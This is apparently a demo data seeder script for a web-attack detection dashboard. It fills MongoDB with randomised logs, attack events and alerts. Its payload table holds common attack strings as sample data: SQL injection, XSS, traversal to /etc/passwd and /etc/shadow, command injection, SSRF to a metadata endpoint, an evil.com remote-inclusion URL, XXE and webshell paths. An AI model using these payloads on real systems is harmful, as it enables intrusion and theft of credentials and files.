/**
 * SENTINAL — Demo Data Seeder
 * Usage: node backend/scripts/seed.js
 * Requires MONGO_URI in backend/.env
 */
require('dotenv').config({ path: require('path').join(__dirname, '../.env') });
const mongoose = require('mongoose');
const SystemLog = require('../src/models/SystemLog');
const AttackEvent = require('../src/models/AttackEvent');
const Alert = require('../src/models/Alert');

const ATTACK_TYPES = ['sqli', 'xss', 'traversal', 'command_injection', 'ssrf', 'lfi_rfi', 'brute_force', 'hpp', 'xxe', 'webshell', 'unknown'];
const SEVERITIES  = ['low', 'medium', 'high', 'critical'];
const STATUSES    = ['attempt', 'successful', 'blocked'];
const DETECTED_BY = ['rule', 'ml', 'both'];
const METHODS     = ['GET', 'POST', 'PUT', 'DELETE'];

const IPS = [
  '192.168.1.101', '10.0.0.55', '203.0.113.42', '198.51.100.7',
  '45.33.32.156',  '104.21.14.3', '185.220.101.47', '77.88.21.3',
  '5.188.206.26',  '91.108.4.1'
];

const PAYLOADS = {
  sqli:              ["' OR 1=1 --", "UNION SELECT * FROM users", "1'; DROP TABLE logs--"],
  xss:               ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(document.cookie)"],
  traversal:         ["../../etc/passwd", "../../../windows/system32/", "....//....//etc/shadow"],
  command_injection: ["; ls -la", "| cat /etc/passwd", "&& whoami"],
  ssrf:              ["http://169.254.169.254/latest/meta-data/", "http://localhost:6379", "http://internal.service/admin"],
  lfi_rfi:          ["/etc/passwd%00", "php://filter/convert.base64-encode/resource=index", "http://evil.com/shell.txt?"],
  brute_force:      ["/login", "/admin/login", "/wp-login.php"],
  hpp:              ["?id=1&id=2&id=3", "?role=user&role=admin"],
  xxe:              ["<!ENTITY xxe SYSTEM \"file:///etc/passwd\">", "<!ENTITY % file SYSTEM \"php://filter/\">" ],
  webshell:         ["/uploads/shell.php?cmd=id", "/images/eval.php", "/static/cmd.php?c=whoami"],
  unknown:          ["/admin", "/phpmyadmin", "/.env"]
};

const EXPLANATIONS = {
  sqli:              'SQL injection attempt detected in query parameter. Attacker attempting to bypass authentication.',
  xss:               'Cross-site scripting payload found in request. Could lead to session hijacking.',
  traversal:         'Path traversal attack — attacker attempting to read files outside webroot.',
  command_injection: 'OS command injection in user input. Could allow remote code execution.',
  ssrf:              'SSRF attempt targeting internal metadata service.',
  lfi_rfi:          'Local file inclusion attempt via PHP filter wrapper.',
  brute_force:       'Repeated failed login attempts from single IP detected.',
  hpp:               'HTTP parameter pollution detected — multiple values for same parameter.',
  xxe:               'XML External Entity injection in request body.',
  webshell:          'Webshell access attempt on uploaded file path.',
  unknown:           'Suspicious request pattern detected by ML classifier.'
};

function rand(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function randFloat() { return Math.round((0.6 + Math.random() * 0.4) * 100) / 100; }
function randDate(daysBack = 7) {
  const ms = Date.now() - Math.floor(Math.random() * daysBack * 86400000);
  return new Date(ms);
}
function randCode() { return rand([200, 200, 200, 302, 403, 404, 500]); }

async function seed() {
  try {
    await mongoose.connect(process.env.MONGO_URI);
    console.log('[SEED] Connected to MongoDB');

    // Clear existing demo data
    await SystemLog.deleteMany({});
    await AttackEvent.deleteMany({});
    await Alert.deleteMany({});
    console.log('[SEED] Cleared existing collections');

    const logs = [];
    const attacks = [];
    const alerts = [];

    // Create 80 system logs
    for (let i = 0; i < 80; i++) {
      const ip = rand(IPS);
      const attackType = rand(ATTACK_TYPES);
      const payloadArr = PAYLOADS[attackType];
      const payload = rand(payloadArr);
      const ts = randDate(7);
      logs.push({
        projectId:       'demo-project-001',
        method:          rand(METHODS),
        url:             `/api/resource?input=${encodeURIComponent(payload)}`,
        ip,
        queryParams:     { input: payload },
        body:            {},
        headers:         { userAgent: 'Mozilla/5.0 (compatible; AttackBot/1.0)', contentType: 'application/json', referer: '' },
        responseCode:    randCode(),
        processingTimeMs: Math.floor(Math.random() * 200),
        timestamp:       ts,
        createdAt:       ts,
        updatedAt:       ts
      });
    }

    const insertedLogs = await SystemLog.insertMany(logs);
    console.log(`[SEED] Inserted ${insertedLogs.length} system logs`);

    // Create 50 attack events (each linked to a log)
    for (let i = 0; i < 50; i++) {
      const log      = insertedLogs[i];
      const aType    = rand(ATTACK_TYPES);
      const severity = rand(SEVERITIES);
      const ts       = log.createdAt;
      attacks.push({
        requestId:            log._id,
        ip:                   log.ip,
        attackType:           aType,
        severity,
        status:               randCode() === 403 ? 'blocked' : rand(STATUSES),
        detectedBy:           rand(DETECTED_BY),
        confidence:           randFloat(),
        payload:              rand(PAYLOADS[aType]),
        explanation:          EXPLANATIONS[aType],
        mitigationSuggestion: 'Sanitize user input and apply parameterized queries.',
        responseCode:         log.responseCode,
        timestamp:            ts,
        createdAt:            ts,
        updatedAt:            ts
      });
    }

    const insertedAttacks = await AttackEvent.insertMany(attacks);
    console.log(`[SEED] Inserted ${insertedAttacks.length} attack events`);

    // Create alerts for high/critical attacks
    for (const attack of insertedAttacks) {
      if (['high', 'critical'].includes(attack.severity)) {
        alerts.push({
          attackId: attack._id,
          title:    `${attack.attackType.toUpperCase()} Detected`,
          message:  `${attack.severity} severity attack from ${attack.ip}`,
          severity: attack.severity,
          type:     'attack_detected',
          isRead:   Math.random() > 0.6,
          meta:     { attackType: attack.attackType, confidence: attack.confidence },
          createdAt: attack.createdAt,
          updatedAt: attack.updatedAt
        });
      }
    }

    const insertedAlerts = await Alert.insertMany(alerts);
    console.log(`[SEED] Inserted ${insertedAlerts.length} alerts`);

    console.log('\n[SEED] ✅ Done. Summary:');
    console.log(`  SystemLogs:   ${insertedLogs.length}`);
    console.log(`  AttackEvents: ${insertedAttacks.length}`);
    console.log(`  Alerts:       ${insertedAlerts.length}`);

    await mongoose.disconnect();
    process.exit(0);
  } catch (err) {
    console.error('[SEED] ❌ Error:', err.message);
    process.exit(1);
  }
}

seed();
